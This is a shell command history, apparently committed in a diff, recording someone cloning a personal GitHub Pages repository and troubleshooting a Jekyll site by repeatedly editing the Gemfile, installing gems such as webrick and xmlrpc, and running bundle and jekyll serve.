+  942  sudo apt-get update
+  943  ruby -v
+  944  history
+  945  sudo apt-get upgrade
+  946  ls
+  947  cd Desktop
+  948  ls
+  949  cd portafolio
+  950  ls
+  951  git clone https://github.com/cris1198/cris1198.github.io.git
+  952  ls
+  953  cd cris1198.github.io
+  954  ls
+  955  cat Gemfile
+  956  jekyll -v
+  957  gem install jekyll bundler
+  958  sudo gem install jekyll bundler
+  959  bundle exec jekyll serve
+  960  bundle install
+  961  bundle exec jekyll serve
+  962  jekyll -v
+  963  nano Gemfile
+  964  git add Gemfile Gemfile.lock
+  965  bundle exec jekyll serve
+  966  bundle update
+  967  gem add webrick
+  968  sudo gem webrick
+  969  sudo gem add webrick
+  970  bundle add webrick
+  971  bundle update
+  972  bundle add sdbm
+  973  bundle add xmlrpc
+  974  bundle update
+  975  gem install xmlrpc
+  976  sudo gem install xmlrpc
+  977  sudo gem install unf
+  978  bundle update
+  979  bundle install
+  980  bundle exec jekyll serve
+  981  bundle exec jekyll serve --watch
+  982  nano Gemfile
+  983  bundle exec jekyll serve --watch
+  984  nano Gemfile
+  985  bundle exec jekyll serve --watch
+  986  bundle install
+  987  nano Gemfile
+  988  bundle exec jekyll serve --watch
+  989  nano Gemfile
+  990  bundle install
+  991  nano Gemfile
+  992  bundler
+  993  nano Gemfile
+  994  bundler
+  995  bundle exec jekyll serve --watch
